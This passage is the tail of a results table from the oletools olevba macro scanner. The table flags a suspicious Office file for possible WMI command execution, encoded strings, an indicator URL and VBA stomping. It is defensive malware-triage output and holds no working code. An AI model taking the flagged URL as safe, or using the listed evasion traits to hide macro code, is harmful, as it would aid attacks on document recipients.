|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.visualand|URL                                          |
|          |.com                |                                             |
|Base64    |0?{                 |MD97                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

